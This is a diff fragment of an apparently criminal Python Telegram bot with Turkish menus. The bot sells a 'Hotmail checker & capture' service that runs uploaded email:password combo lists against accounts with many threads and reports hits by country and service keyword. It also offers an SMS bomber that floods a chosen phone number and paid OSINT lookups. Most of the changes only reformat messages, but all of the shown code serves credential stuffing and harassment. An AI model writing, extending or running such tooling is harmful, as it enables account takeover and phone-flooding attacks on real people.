             for country, count in sorted_countries:
                 pct = int((count / HOTMAIL_HIT) * 100) if HOTMAIL_HIT > 0 else 0
                 flag = get_country_flag(country)
                 result_lines.append(f"{flag} {country}: {count} Hit (%{pct})")
-
             if not sorted_countries:
                 result_lines.append("   ❌ Ülke bilgisi yok")
-
+                
             result_lines.append("")
             result_lines.append("📤 Sonuçlar gönderiliyor...")
-
             result_text = "\n".join(result_lines)
-
+            
             try:
                 if main_bot:
                     main_bot.edit_message_text(result_text, task.chat_id, task.status_msg_id)
@@ -3529,22 +3497,21 @@ def process_hotmail_queue():
                         with open(hit_file, "rb") as f:
                             main_bot.send_document(
                                 task.chat_id, f,
-                                caption=f"✅ {HOTMAIL_HIT}x Hotmail Hit\n\n📊 Toplam Hit: {HOTMAIL_HIT}"
+                                caption=f"✅ {HOTMAIL_HIT}x Hotmail Hit\n📊 Toplam Hit: {HOTMAIL_HIT}"
                             )
                         os.remove(hit_file)
             except:
                 pass
-
+                
             print(f"✅ TARAMA TAMAMLANDI | {task.user_name} | HIT: {HOTMAIL_HIT}")
-
+            
             with HOTMAIL_QUEUE_LOCK:
                 HOTMAIL_CURRENT_TASK = None
-
+                
         except Exception as e:
             print(f"[QUEUE ERROR] {e}")
             with HOTMAIL_QUEUE_LOCK:
                 HOTMAIL_CURRENT_TASK = None
-
 
 def start_queue_processor():
     global HOTMAIL_QUEUE_RUNNING, HOTMAIL_QUEUE_THREAD
@@ -3554,7 +3521,6 @@ def start_queue_processor():
     HOTMAIL_QUEUE_THREAD = threading.Thread(target=process_hotmail_queue, daemon=True)
     HOTMAIL_QUEUE_THREAD.start()
 
-
 def add_to_queue(task: HotmailTask):
     with HOTMAIL_QUEUE_LOCK:
         position = HOTMAIL_QUEUE.qsize() + 1
@@ -3562,58 +3528,57 @@ def add_to_queue(task: HotmailTask):
             position += 1
         task.queue_position = position
         HOTMAIL_QUEUE.put(task)
-
-    try:
-        if main_bot:
-            is_prem = task.is_premium
-            limit_text = f"{PREMIUM_CHECK_LIMIT}" if is_prem else f"{FREE_CHECK_LIMIT}"
-            main_bot.send_message(
-                task.chat_id,
-                f"🚀 **Hotmail taraması sıraya alınıyor...**\n\n"
-                f"⏳ **Sıraya Alındınız! Sıra Numaranız:** {position}\n\n"
-                f"⚠️ **Sebep:** {'⭐ Premium kullanıcı (Sınırsız)' if is_prem else f'🆓 Free kullanıcı ({FREE_CHECK_LIMIT} satır limit)'}\n\n"
-                f"🔀 **Modül:** HOTMAIL\n\n"
-                f"Sıranızı takip etmek için /queue komutunu kullanabilirsiniz.\n"
-                f"Sıra size geldiğinde otomatik başlayacak.\n\n"
-                f"📊 **Limit:** {limit_text} satır\n"
-                f"🔖 **Keyword Limit:** {get_keyword_limit_text(task.user_id)}"
-            )
-    except:
-        pass
-
+        
+        try:
+            if main_bot:
+                is_prem = task.is_premium
+                limit_text = f"{PREMIUM_CHECK_LIMIT}" if is_prem else f"{FREE_CHECK_LIMIT}"
+                main_bot.send_message(
+                    task.chat_id,
+                    f"🚀 **Hotmail taraması sıraya alınıyor...**\n"
+                    f"⏳ **Sıraya Alındınız! Sıra Numaranız:** {position}\n"
+                    f"⚠️ **Sebep:** {'⭐ Premium kullanıcı (Sınırsız)' if is_prem else f'🆓 Free kullanıcı ({FREE_CHECK_LIMIT} satır limit)'}\n"
+                    f"🔀 **Modül:** HOTMAIL\n"
+                    f"Sıranızı takip etmek için /queue komutunu kullanabilirsiniz.\n"
+                    f"Sıra size geldiğinde otomatik başlayacak.\n"
+                    f"📊 **Limit:** {limit_text} satır\n"
+                    f"🔖 **Keyword Limit:** {get_keyword_limit_text(task.user_id)}"
+                )
+        except:
+            pass
 
 def _process_hotmail_file(msg, bot_instance):
     uid = msg.from_user.id
     if not msg.document:
         bot_instance.reply_to(msg, "❌ Lütfen geçerli bir dosya gönderin!")
         return
-
+        
     try:
         file_info = bot_instance.get_file(msg.document.file_id)
         downloaded = bot_instance.download_file(file_info.file_path)
         combo_text = downloaded.decode("utf-8", errors="ignore")
         combo_list = [line.strip() for line in combo_text.splitlines() if line.strip() and ":" in line.strip()]
-
+        
         if not combo_list:
             bot_instance.reply_to(msg, "❌ Dosyada geçerli combo (email:password) bulunamadı!")
             return
-
+            
         is_prem = is_premium(uid)
         max_lines = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
-
+        
         if len(combo_list) > max_lines:
             bot_instance.reply_to(
                 msg,
-                f"⚠️ **Dosya çok büyük!**\n\n"
+                f"⚠️ **Dosya çok büyük!**\n"
                 f"📂 Dosyada {len(combo_list)} satır var.\n"
-                f"📌 {'⭐ Premium' if is_prem else '🆓 Free'} limit: {max_lines} satır\n\n"
+                f"📌 {'⭐ Premium' if is_prem else '🆓 Free'} limit: {max_lines} satır\n"
                 f"Lütfen dosyayı {max_lines} satıra indirip tekrar gönderin."
             )
             return
-
+            
         m = bot_instance.reply_to(
             msg,
-            f"✅ **{len(combo_list)}** satır bulundu.\n\n"
+            f"✅ **{len(combo_list)}** satır bulundu.\n"
             f"⚙️ Thread sayısını girin (10-100):\n"
             f"Varsayılan: 10"
         )
@@ -3621,11 +3586,9 @@ def _process_hotmail_file(msg, bot_instance):
     except Exception as e:
         bot_instance.reply_to(msg, f"❌ Dosya okunamadı: {e}")
 
-
 def _start_hotmail_scan_queue(msg, combo_list, bot_instance):
     uid = msg.from_user.id
     global HOTMAIL_THREADS
-
     try:
         thread_count = int(msg.text.strip())
         if thread_count < 1:
@@ -3634,24 +3597,24 @@ def _start_hotmail_scan_queue(msg, combo_list, bot_instance):
             thread_count = 100
     except:
         thread_count = 10
-
+        
     HOTMAIL_THREADS = thread_count
     is_prem = is_premium(uid)
     user_name = get_user_name(uid)
     keywords = get_user_keywords(uid)
-
+    
     start_queue_processor()
-
+    
     status_msg = bot_instance.reply_to(
         msg,
-        f"⏳ **Dosyanız sıraya alınıyor...**\n\n"
+        f"⏳ **Dosyanız sıraya alınıyor...**\n"
         f"👤 {user_name}\n"
         f"📂 {len(combo_list)} satır\n"
         f"⚙️ Thread: {thread_count}\n"
         f"{'⭐ Premium' if is_prem else '🆓 Free'}\n"
         f"🔖 Keywordler: {', '.join(keywords)}"
     )
-
+    
     task = HotmailTask(
         user_id=uid,
         user_name=user_name,
@@ -3662,9 +3625,7 @@ def _start_hotmail_scan_queue(msg, combo_list, bot_instance):
         is_premium=is_prem,
         keywords=keywords
     )
-
     add_to_queue(task)
-
 
 def get_queue_status_text(user_id: int = None) -> str:
     with HOTMAIL_QUEUE_LOCK:
@@ -3675,6 +3636,7 @@ def get_queue_status_text(user_id: int = None) -> str:
             lines.append(f"  🔄 **[HOTMAIL] [{prem}] {task.get('user_name')} | İşleniyor ({len(task.get('combo_list', []))} satır)**")
         else:
             lines.append("  ⏸️ Şu an işlem yok")
+            
         queue_list = list(HOTMAIL_QUEUE.queue)
         if queue_list:
             lines.append("")
@@ -3685,17 +3647,15 @@ def get_queue_status_text(user_id: int = None) -> str:
                 lines.append(f"  {i}. **[HOTMAIL] [{prem}] {task.user_name} | ⏳ Sırada ({len(task.combo_list)} satır)**")
         else:
             lines.append("  📭 Sırada bekleyen yok")
+            
         lines.append("")
         lines.append("👨‍💻 @hackledin")
         return "\n".join(lines)
 
-
 # ══════════════════════════════════════════════════════════════
 #  HANDLER FUNCTIONS
 # ══════════════════════════════════════════════════════════════
-
 main_bot = None
-
 
 def register_handlers(bot_instance):
     global main_bot
@@ -3704,18 +3664,16 @@ def register_handlers(bot_instance):
     @bot_instance.message_handler(commands=["start"])
     def cmd_start(msg):
         uid = msg.from_user.id
-
         if is_banned(uid):
             bot_instance.reply_to(
                 msg,
-                f"🚫 **YASAKLANDINIZ!**\n\n"
-                f"📌 Sebep: {get_ban_reason(uid)}\n\n"
+                f"🚫 **YASAKLANDINIZ!**\n"
+                f"❌ Bu botu kullanmanız yasaklanmıştır.\n"
+                f"📌 Sebep: {get_ban_reason(uid)}\n"
                 f"📞 İtiraz için: @hackledin"
             )
             return
-
         add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
-
         mk = InlineKeyboardMarkup(row_width=3)
         mk.add(_btn("🇹🇷 Türkçe", "lang_tr"), _btn("🇬🇧 English", "lang_en"), _btn("🇸🇦 العربية", "lang_ar"))
         bot_instance.reply_to(msg, s(uid, "lang_pick"), reply_markup=mk)
@@ -3723,20 +3681,17 @@ def register_handlers(bot_instance):
     @bot_instance.message_handler(commands=["premium"])
     def cmd_premium(msg):
         uid = msg.from_user.id
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
         if is_premium(uid):
             bot_instance.reply_to(msg, s(uid, "already_premium"))
             return
-
         txt = (
             f"{s(uid, 'premium_title')}\n"
             f"━━━━━━━━━━━━━━━━━━━━━\n"
             f"{s(uid, 'premium_price_txt', price=PREMIUM_PRICE)}\n"
-            f"{s(uid, 'premium_dur')}\n\n"
+            f"{s(uid, 'premium_dur')}\n"
             f"{s(uid, 'premium_features')}"
         )
         bot_instance.reply_to(msg, txt, reply_markup=premium_kb(uid))
@@ -3744,17 +3699,14 @@ def register_handlers(bot_instance):
     @bot_instance.message_handler(commands=["hotmail"])
     def cmd_hotmail(msg):
         uid = msg.from_user.id
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
         user_name = get_user_name(uid)
         keywords = get_user_keywords(uid)
         limit_text = get_keyword_limit_text(uid)
         is_prem = is_premium(uid)
         capture_left = get_capture_limit_text(uid)
-
         bot_instance.reply_to(
             msg,
             f"📧 **HOTMAIL CHECKER & CAPTURE**\n"
@@ -3763,7 +3715,7 @@ def register_handlers(bot_instance):
             f"🔖 Keyword: {', '.join(keywords)}\n"
             f"📊 Keyword Limit: {limit_text}\n"
             f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT} satır)'}\n"
-            f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n\n"
+            f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n"
             f"📌 Aşağıdaki menüden işlem yapın:",
             reply_markup=hotmail_keyboard(uid)
         )
@@ -3782,13 +3734,10 @@ def register_handlers(bot_instance):
     @bot_instance.message_handler(commands=["istatistik"])
     def cmd_stats_detailed(msg):
         uid = msg.from_user.id
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
         tu, prem_pu, osint_pu, tc, tch = get_bot_stats()
-
         stats_text = (
             f"📊 **SİSTEM İSTATİSTİKLERİ**\n"
             f"━━━━━━━━━━━━━━━━━━━━━\n"
@@ -3796,7 +3745,7 @@ def register_handlers(bot_instance):
             f"📧 Hotmail Premium: {prem_pu or 0}\n"
             f"🌍 OSINT Premium: {osint_pu or 0}\n"
             f"📦 Toplam Combo: {tc or 0}\n"
-            f"🔍 Toplam Sorgu: {tch or 0}\n\n"
+            f"🔍 Toplam Sorgu: {tch or 0}\n"
             f"👨‍💻 @hackledin"
         )
         bot_instance.reply_to(msg, stats_text)
@@ -3805,16 +3754,14 @@ def register_handlers(bot_instance):
     def cmd_exif(msg):
         uid = msg.from_user.id
         add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
         bot_instance.reply_to(
             msg,
             "📸 <b>EXIF Metadata Okuyucu</b>\n"
-            f"{'━' * 28}\n\n"
-            "Analiz etmek istediğin fotoğrafı gönder.\n\n"
+            f"{'━' * 28}\n"
+            "Analiz etmek istediğin fotoğrafı gönder.\n"
             "📋 <b>Okunacak Bilgiler:</b>\n"
             "• 📱 Cihaz markası ve modeli\n"
             "• 📅 Çekim tarihi ve saati\n"
@@ -3822,7 +3769,8 @@ def register_handlers(bot_instance):
             "• 🎯 ISO, diyafram, obtüratör, odak\n"
             "• ⚡ Flaş durumu ve lens bilgisi\n"
             "• 📍 GPS koordinatları (varsa)\n"
-            "• 🗺 Google Maps linki (varsa)\n\n"
+            "• 🗺 Google Maps linki (varsa)\n"
+            "• ⛰ Rakım ve GPS zamanı\n"
             "<i>⚠️ Sosyal medyadan indirilmiş fotoğraflarda "
             "EXIF silinmiş olabilir.</i>",
             parse_mode="HTML"
@@ -3835,11 +3783,9 @@ def register_handlers(bot_instance):
     @bot_instance.message_handler(commands=["addbot"])
     def cmd_addbot(msg):
         uid = msg.from_user.id
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
         parts = msg.text.split()
         if len(parts) < 2:
             bot_instance.reply_to(msg, s(uid, "multi_bot_add_usage"))
@@ -3855,15 +3801,15 @@ def register_handlers(bot_instance):
             if token in _CHILD_PROCS and _CHILD_PROCS[token].poll() is None:
                 bot_instance.reply_to(msg, s(uid, "multi_bot_exists"))
                 return
-        try:
-            success = _spawn_bot(token, uid)
-            if success:
-                bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
-                                             owner=msg.from_user.first_name or str(uid)))
-            else:
-                bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
-        except Exception as e:
-            bot_instance.reply_to(msg, f"❌ Hata: {e}")
+            try:
+                success = _spawn_bot(token, uid)
+                if success:
+                    bot_instance.reply_to(msg, s(uid, "multi_bot_added", token=token[:20] + "...",
+                                                 owner=msg.from_user.first_name or str(uid)))
+                else:
+                    bot_instance.reply_to(msg, "❌ Bot başlatılamadı!")
+            except Exception as e:
+                bot_instance.reply_to(msg, f"❌ Hata: {e}")
 
     @bot_instance.message_handler(commands=["video"])
     def cmd_video(msg):
@@ -3877,26 +3823,24 @@ def register_handlers(bot_instance):
     @bot_instance.message_handler(commands=["smsbomb", "sms"])
     def cmd_smsbomb(msg):
         uid = msg.from_user.id
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
         with _SMS_LOCK:
             if uid in _SMS_SESSIONS and _SMS_SESSIONS[uid].get("running"):
                 sess = _SMS_SESSIONS[uid]
                 bot_instance.reply_to(
                     msg,
-                    f"⚠️ <b>Aktif Bombardıman Var!</b>\n\n"
+                    f"⚠️ <b>Aktif Bombardıman Var!</b>\n"
                     f"📱 Hedef: <code>{sess['target']}</code>\n"
                     f"📊 Gönderilen: <b>{sess['count']}</b>\n"
-                    f"⚙️ Mod: <b>{sess.get('mode', '—').upper()}</b>\n\n"
+                    f"⚙️ Mod: <b>{sess.get('mode', '—').upper()}</b>\n"
                     f"🛑 Önce durdurun: /smsstop"
                 )
                 return
         m = bot_instance.reply_to(
             msg,
-            "💣 <b>SMS Bomber</b>\n\n"
+            "💣 <b>SMS Bomber</b>\n"
             "📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\n"
             "Örnek: <code>5306524123</code>"
         )
@@ -3914,12 +3858,12 @@ def register_handlers(bot_instance):
             sess["running"] = False
             count = sess["count"]
             target = sess["target"]
-        bot_instance.reply_to(
-            msg,
-            f"🛑 <b>SMS Bomber Durduruldu</b>\n\n"
-            f"📱 Hedef: <code>{target}</code>\n"
-            f"📊 Toplam Gönderilen: <b>{count}</b> SMS"
-        )
+            bot_instance.reply_to(
+                msg,
+                f"🛑 <b>SMS Bomber Durduruldu</b>\n"
+                f"📱 Hedef: <code>{target}</code>\n"
+                f"📊 Toplam Gönderilen: <b>{count}</b> SMS"
+            )
 
     @bot_instance.message_handler(commands=["smsstatus"])
     def cmd_smsstatus(msg):
@@ -3929,16 +3873,16 @@ def register_handlers(bot_instance):
                 bot_instance.reply_to(msg, "📊 Hiç SMS bombardımanı başlatılmadı.")
                 return
             sess = dict(_SMS_SESSIONS[uid])
-        status = "🟢 Aktif" if sess.get("running") else "🔴 Durdu"
-        bot_instance.reply_to(
-            msg,
-            f"📊 <b>SMS Bomber Durumu</b>\n\n"
-            f"📱 Hedef: <code>{sess['target']}</code>\n"
-            f"📌 Durum: <b>{status}</b>\n"
-            f"⚙️ Mod: <b>{sess.get('mode', '—').upper()}</b>\n"
-            f"📊 Gönderilen: <b>{sess['count']}</b> SMS\n"
-            f"🕐 Başlangıç: {sess.get('start_time', '—')}"
-        )
+            status = "🟢 Aktif" if sess.get("running") else "🔴 Durdu"
+            bot_instance.reply_to(
+                msg,
+                f"📊 <b>SMS Bomber Durumu</b>\n"
+                f"📱 Hedef: <code>{sess['target']}</code>\n"
+                f"📌 Durum: <b>{status}</b>\n"
+                f"⚙️ Mod: <b>{sess.get('mode', '—').upper()}</b>\n"
+                f"📊 Gönderilen: <b>{sess['count']}</b> SMS\n"
+                f"🕐 Başlangıç: {sess.get('start_time', '—')}"
+            )
 
     @bot_instance.message_handler(commands=["admin"])
     def cmd_admin(msg):
@@ -3946,7 +3890,6 @@ def register_handlers(bot_instance):
         if uid != ADMIN_ID:
             bot_instance.reply_to(msg, s(uid, "admin_only"))
             return
-
         mk = InlineKeyboardMarkup(row_width=2)
         mk.add(
             _btn("📊 Bot İstatistik", "adm_stats"),
@@ -3967,17 +3910,16 @@ def register_handlers(bot_instance):
     def handle_photo_exif(msg):
         uid = msg.from_user.id
         add_user(uid, msg.from_user.username or "", msg.from_user.first_name or "")
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
+            
         caption = (msg.caption or "").strip().lower()
         exif_trigger = any(
             caption == t or caption.startswith(t + " ")
             for t in ("/exif", "/meta", "/foto", "exif", "meta")
         )
-
+        
         if msg.content_type == "document":
             doc = msg.document
             if doc.mime_type not in (
@@ -3986,17 +3928,16 @@ def register_handlers(bot_instance):
             ):
                 if exif_trigger:
                     bot_instance.reply_to(msg,
-                        "❌ Bu dosya bir resim değil!\n"
-                        "Desteklenen formatlar: JPEG, PNG, TIFF, WEBP"
-                    )
+                                          "❌ Bu dosya bir resim değil!\n"
+                                          "Desteklenen formatlar: JPEG, PNG, TIFF, WEBP"
+                                          )
                 return
-
-        if caption != "" and not exif_trigger:
-            return
-
+            if caption != "" and not exif_trigger:
+                return
+                
         wait_msg = bot_instance.reply_to(msg, "🔍 Fotoğraf analiz ediliyor, lütfen bekle...")
-
         gecici = f"/tmp/exif_{uid}_{int(time.time())}.jpg"
+        
         try:
             if msg.content_type == "photo":
                 file_id = msg.photo[-1].file_id
@@ -4005,12 +3946,11 @@ def register_handlers(bot_instance):
             else:
                 file_info = bot_instance.get_file(msg.document.file_id)
                 dosya = bot_instance.download_file(file_info.file_path)
-
+                
             with open(gecici, "wb") as f:
                 f.write(dosya)
-
+                
             sonuc, hata = _exif_analiz(gecici)
-
             if hata:
                 bot_instance.edit_message_text(
                     hata,
@@ -4018,7 +3958,7 @@ def register_handlers(bot_instance):
                     parse_mode="HTML"
                 )
                 return
-
+                
             mesaj = _exif_mesaj_olustur(sonuc)
             bot_instance.edit_message_text(
                 mesaj,
@@ -4026,7 +3966,6 @@ def register_handlers(bot_instance):
                 parse_mode="HTML",
                 disable_web_page_preview=False
             )
-
         except Exception as e:
             try:
                 bot_instance.edit_message_text(
@@ -4054,14 +3993,13 @@ def register_handlers(bot_instance):
     @bot_instance.message_handler(func=lambda m: True, content_types=["text"])
     def handle_text(msg):
         uid = msg.from_user.id
-
         if is_banned(uid):
             bot_instance.reply_to(msg, f"🚫 **YASAKLANDINIZ!**\nSebep: {get_ban_reason(uid)}")
             return
-
         txt = msg.text
         l = lang(uid)
         keys = MENU_KEYS.get(l, MENU_KEYS["tr"])
+        
         if txt == keys.get("combo"):
             m = bot_instance.reply_to(msg, s(uid, "combo_ask"))
             bot_instance.register_next_step_handler(m, lambda m: _process_combo(m, bot_instance))
@@ -4083,7 +4021,7 @@ def register_handlers(bot_instance):
         try:
             uid = call.from_user.id
             data = call.data
-
+            
             if data.startswith("lang_"):
                 l = data[5:]
                 db_set(uid, "language", l)
@@ -4097,7 +4035,6 @@ def register_handlers(bot_instance):
                     bot_instance.delete_message(call.message.chat.id, call.message.message_id)
                 except:
                     pass
-
                 bot_instance.send_message(
                     call.message.chat.id,
                     s(uid, "welcome", name=name, status=status),
@@ -4153,9 +4090,9 @@ def register_handlers(bot_instance):
                     mk = InlineKeyboardMarkup()
                     mk.add(_btn("🌍 OSINT Premium Satın Al (200⭐)", "buy_osint"))
                     mk.add(_btn(s(uid, "back_btn"), "goto_tools"))
-                    txt = (f"🔒 <b>LeakSights OSINT — Premium</b>\n\n"
+                    txt = (f"🔒 <b>LeakSights OSINT — Premium</b>\n"
                            f"💰 Fiyat: 200 Yıldız\n"
-                           f"♾️ Süre: Sınırsız (Ömür Boyu)\n\n"
+                           f"♾️ Süre: Sınırsız (Ömür Boyu)\n"
                            f"🔍 30+ OSINT Sorgu")
                     try:
                         bot_instance.answer_callback_query(call.id)
@@ -4231,8 +4168,17 @@ def register_handlers(bot_instance):
                 bot_instance.send_message(
                     call.message.chat.id,
                     "📸 <b>EXIF Metadata Okuyucu</b>\n"
-                    f"{'━' * 28}\n\n"
-                    "Analiz etmek istediğin fotoğrafı gönder.\n\n"
+                    f"{'━' * 28}\n"
+                    "Analiz etmek istediğin fotoğrafı gönder.\n"
+                    "📋 <b>Okunacak Bilgiler:</b>\n"
+                    "• 📱 Cihaz markası ve modeli\n"
+                    "• 📅 Çekim tarihi ve saati\n"
+                    "• 📐 Çözünürlük ve teknik parametreler\n"
+                    "• 🎯 ISO, diyafram, obtüratör, odak\n"
+                    "• ⚡ Flaş durumu ve lens bilgisi\n"
+                    "• 📍 GPS koordinatları (varsa)\n"
+                    "• 🗺 Google Maps linki (varsa)\n"
+                    "• ⛰ Rakım ve GPS zamanı\n"
                     "<i>⚠️ Sosyal medyadan indirilmiş fotoğraflarda "
                     "EXIF silinmiş olabilir.</i>",
                     parse_mode="HTML"
@@ -4246,15 +4192,15 @@ def register_handlers(bot_instance):
                     pass
                 bot_instance.send_message(
                     call.message.chat.id,
-                    "🎵 **Müzik İndirici (MP3)**\n"
-                    "━━━━━━━━━━━━━━━━━━━━━\n\n"
+                    "🎵 **Müzik İndirici**\n"
+                    "━━━━━━━━━━━━━━━━━━━━━\n"
                     "📌 **Kullanım:**\n"
                     "`/sarki Sanatçı Şarkı`\n"
-                    "`/sarki https://youtube.com/...`\n\n"
+                    "`/sarki https://youtube.com/...`\n"
                     "🎯 **Örnekler:**\n"
                     "`/sarki Tarkan Dudu`\n"
-                    "`/sarki Hadise Feryat`\n\n"
-                    "📁 Format: `.mp3` (192 kbps)"
+                    "`/sarki Hadise Feryat`\n"
+                    "📁 Format: `.mp3` (ffmpeg varsa) / `.m4a`"
                 )
                 return
 
@@ -4263,14 +4209,13 @@ def register_handlers(bot_instance):
                 mode = parts[1]
                 phone = parts[2]
                 mail = parts[3] if len(parts) > 3 else ""
-
                 if mode == "normal":
                     m = bot_instance.send_message(
                         call.message.chat.id,
-                        f"⚡ **Normal Mod Seçildi**\n\n"
-                        f"📱 Hedef: <code>{phone}</code>\n\n"
+                        f"⚡ **Normal Mod Seçildi**\n"
+                        f"📱 Hedef: <code>{phone}</code>\n"
                         f"🔢 Limit gir (Sonsuz için 0):\n"
-                        f"⏱ Aralık gir (saniye, 0=anında):\n\n"
+                        f"⏱ Aralık gir (saniye, 0=anında):\n"
                         f"Örnek: <code>50 2</code> (50 SMS, 2 saniye aralık)"
                     )
                     bot_instance.register_next_step_handler(m, lambda m: _sms_normal_settings(m, phone, mail, bot_instance))
@@ -4310,7 +4255,7 @@ def register_handlers(bot_instance):
                         return
                 m = bot_instance.send_message(
                     call.message.chat.id,
-                    "💣 <b>SMS Bomber</b>\n\n📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\nÖrnek: <code>5306524123</code>"
+                    "💣 <b>SMS Bomber</b>\n📱 Hedef numarayı girin (10 haneli, başında 0 olmadan):\nÖrnek: <code>5306524123</code>"
                 )
                 bot_instance.register_next_step_handler(m, lambda m: _sms_step1_number(m, bot_instance))
                 try:
@@ -4325,12 +4270,10 @@ def register_handlers(bot_instance):
                 limit_text = get_keyword_limit_text(uid)
                 is_prem = is_premium(uid)
                 capture_left = get_capture_limit_text(uid)
-
                 try:
                     bot_instance.answer_callback_query(call.id)
                 except:
                     pass
-
                 try:
                     bot_instance.edit_message_text(
                         f"📧 **HOTMAIL CHECKER & CAPTURE**\n"
@@ -4339,7 +4282,7 @@ def register_handlers(bot_instance):
                         f"🔖 Keyword: {', '.join(keywords)}\n"
                         f"📊 Keyword Limit: {limit_text}\n"
                         f"📧 Hotmail: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({FREE_CHECK_LIMIT} satır)'}\n"
-                        f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n\n"
+                        f"📸 Capture: {'⭐ Premium (Sınırsız)' if is_prem else f'🆓 Free ({capture_left} kaldı)'}\n"
                         f"📌 Aşağıdaki menüden işlem yapın:",
                         call.message.chat.id,
                         call.message.message_id,
@@ -4348,7 +4291,7 @@ def register_handlers(bot_instance):
                 except:
                     bot_instance.send_message(
                         call.message.chat.id,
-                        f"📧 **HOTMAIL CHECKER & CAPTURE**\n\n"
+                        f"📧 **HOTMAIL CHECKER & CAPTURE**\n"
                         f"📌 Aşağıdaki menüden işlem yapın:",
                         reply_markup=hotmail_keyboard(uid)
                     )
@@ -4359,16 +4302,14 @@ def register_handlers(bot_instance):
                     bot_instance.answer_callback_query(call.id)
                 except:
                     pass
-
                 is_prem = is_premium(uid)
                 limit = PREMIUM_CHECK_LIMIT if is_prem else FREE_CHECK_LIMIT
-
                 m = bot_instance.send_message(
                     call.message.chat.id,
-                    f"📧 **Hotmail Checker**\n\n"
+                    f"📧 **Hotmail Checker**\n"
                     f"📌 Limit: {limit} satır\n"
                     f"🔖 Keyword Limit: {get_keyword_limit_text(uid)}\n"
-                    f"{'⭐ Premium' if is_prem else '🆓 Free'}\n\n"
+                    f"{'⭐ Premium' if is_prem else '🆓 Free'}\n"
                     f"Lütfen combo dosyasını (email:password) gönderin."
                 )
                 bot_instance.register_next_step_handler(m, lambda m: _process_hotmail_file(m, bot_instance))
@@ -4385,17 +4326,15 @@ def register_handlers(bot_instance):
                     except:
                         pass
                     return
-
                 try:
                     bot_instance.answer_callback_query(call.id)
                 except:
                     pass
-
                 m = bot_instance.send_message(
                     call.message.chat.id,
-                    f"➕ **Keyword Ekle**\n\n"
+                    f"➕ **Keyword Ekle**\n"
                     f"Mevcut: {', '.join(get_user_keywords(uid))}\n"
-                    f"Limit: {get_keyword_limit_text(uid)}\n\n"
+                    f"Limit: {get_keyword_limit_text(uid)}\n"
                     f"Eklemek istediğin keyword'ü yaz:\n"
                     f"(Birden fazla için virgülle ayır: netflix,paypal,amazon)"
                 )
@@ -4407,11 +4346,10 @@ def register_handlers(bot_instance):
                     bot_instance.answer_callback_query(call.id)
                 except:
                     pass
-
                 m = bot_instance.send_message(
                     call.message.chat.id,
-                    f"🗑️ **Keyword Sil**\n\n"
-                    f"Mevcut: {', '.join(get_user_keywords(uid))}\n\n"
+                    f"🗑️ **Keyword Sil**\n"
+                    f"Mevcut: {', '.join(get_user_keywords(uid))}\n"
                     f"Silmek istediğin keyword'ü yaz:\n"
                     f"(Birden fazla için virgülle ayır: netflix,paypal)"
                 )
@@ -4438,19 +4376,17 @@ def register_handlers(bot_instance):
                     except:
                         pass
                     return
-
                 try:
                     bot_instance.answer_callback_query(call.id)
                 except:
                     pass
-
                 try:
                     bot_instance.edit_message_text(
                         f"📸 **CAPTURE TOOL**\n"
                         f"━━━━━━━━━━━━━━━━━━━━━\n"
                         f"👤 Kullanıcı: {get_user_name(uid)}\n"
                         f"📊 Platform: 20 Farklı\n"
-                        f"{'⭐ Premium (Sınırsız)' if is_premium(uid) else f'🆓 Free ({get_capture_limit_text(uid)} kaldı)'}\n\n"
+                        f"{'⭐ Premium (Sınırsız)' if is_premium(uid) else f'🆓 Free ({get_capture_limit_text(uid)} kaldı)'}\n"
                         f"📌 Aşağıdan platform seçin:",
                         call.message.chat.id,
                         call.message.message_id,
@@ -4459,7 +4395,7 @@ def register_handlers(bot_instance):
                 except:
                     bot_instance.send_message(
                         call.message.chat.id,
-                        f"📸 **CAPTURE TOOL**\n\n"
+                        f"📸 **CAPTURE TOOL**\n"
                         f"📌 Aşağıdan platform seçin:",
                         reply_markup=capture_keyboard(uid)
                     )
@@ -4494,15 +4430,13 @@ def register_handlers(bot_instance):
                     except:
                         pass
                     return
-
                 try:
                     bot_instance.answer_callback_query(call.id)
                 except:
                     pass
-
                 m = bot_instance.send_message(
                     call.message.chat.id,
-                    f"📸 **Tüm Platformlar Seçildi**\n\n"
+                    f"📸 **Tüm Platformlar Seçildi**\n"
                     f"Lütfen combo dosyasını (email:password) gönderin."
                 )
                 bot_instance.register_next_step_handler(m, lambda m: _process_capture_file(m, bot_instance, None))
@@ -4514,15 +4448,13 @@ def register_handlers(bot_instance):
                     if num in CAPTURE_APPS:
                         target_app = CAPTURE_APPS[num]
                         platform_name = CAPTURE_NAMES[num]
-
                         try:
                             bot_instance.answer_callback_query(call.id)
                         except:
                             pass
-
                         m = bot_instance.send_message(
                             call.message.chat.id,
-                            f"📸 **{platform_name} Seçildi**\n\n"
+                            f"📸 **{platform_name} Seçildi**\n"
                             f"Lütfen combo dosyasını (email:password) gönderin."
                         )
